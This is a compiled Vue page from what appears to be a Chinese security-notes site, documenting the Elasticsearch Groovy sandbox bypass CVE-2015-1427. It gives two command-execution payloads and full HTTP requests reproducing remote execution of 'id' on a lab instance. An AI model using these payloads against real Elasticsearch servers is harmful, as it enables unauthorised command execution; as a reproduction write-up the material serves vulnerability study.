import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o,c as l,a as e,b as n,d as i,e as r}from"./app-58e4a7d6.js";const d={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),u=e("p",null,"CVE-2014-3120后，ElasticSearch默认的动态脚本语言换成了Groovy，并增加了沙盒，但默认仍然支持直接执行动态语言。本漏洞：1.是一个沙盒绕过； 2.是一个Goovy代码执行漏洞。",-1),p=e("p",null,"参考阅读：",-1),v={href:"http://cb.drops.wiki/drops/papers-5107.html",target:"_blank",rel:"noopener noreferrer"},m={href:"http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/",target:"_blank",rel:"noopener noreferrer"},h={href:"https://github.com/XiphosResearch/exploits",target:"_blank",rel:"noopener noreferrer"},b={href:"http://cb.drops.wiki/drops/papers-5142.html",target:"_blank",rel:"noopener noreferrer"},g=r(`<p><strong>Groovy语言“沙盒”</strong></p><p>ElasticSearch支持使用“在沙盒中的”Groovy语言作为动态脚本，但显然官方的工作并没有做好。lupin和tang3分别提出了两种执行命令的方法：</p><ol><li>既然对执行Java代码有沙盒，lupin的方法是想办法绕过沙盒，比如使用Java反射</li><li>Groovy原本也是一门语言，于是tang3另辟蹊径，使用Groovy语言支持的方法，来直接执行命令，无需使用Java语言</li></ol><p>所以，根据这两种执行漏洞的思路，我们可以获得两个不同的POC。</p><p>Java沙盒绕过法：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java.lang.Math.class.forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;id&quot;).getText()
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>Goovy直接执行命令法：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>def command=&#39;id&#39;;def res=command.execute().text;res
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>jre版本：openjdk:8-jre</p><p>elasticsearch版本：v1.4.2</p><p>由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /website/blog/ HTTP/1.1
Host: 192.168.44.132:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  &quot;name&quot;: &quot;test&quot;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后发送包含payload的数据包，执行任意命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /_search?pretty HTTP/1.1
Host: 192.168.44.132:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 156

{&quot;size&quot;:1, &quot;script_fields&quot;: {&quot;lupin&quot;:{&quot;lang&quot;:&quot;groovy&quot;,&quot;script&quot;: &quot;java.lang.Math.class.forName(\\&quot;java.lang.Runtime\\&quot;).getRuntime().exec(\\&quot;id\\&quot;).getText()&quot;}}}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>结果如图所示：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230328161241539.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,17);function _(x,f){const t=s("ExternalLinkIcon");return o(),l("div",null,[c,u,p,e("ul",null,[e("li",null,[e("a",v,[n("http://cb.drops.wiki/drops/papers-5107.html"),i(t)])]),e("li",null,[e("a",m,[n("http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/"),i(t)])]),e("li",null,[e("a",h,[n("https://github.com/XiphosResearch/exploits"),i(t)])]),e("li",null,[e("a",b,[n("http://cb.drops.wiki/drops/papers-5142.html"),i(t)])])]),g])}const k=a(d,[["render",_],["__file","ElasticSearch Groovy 沙盒绕过 _ 代码执行漏洞 CVE-2015-1427.html.vue"]]);export{k as default};
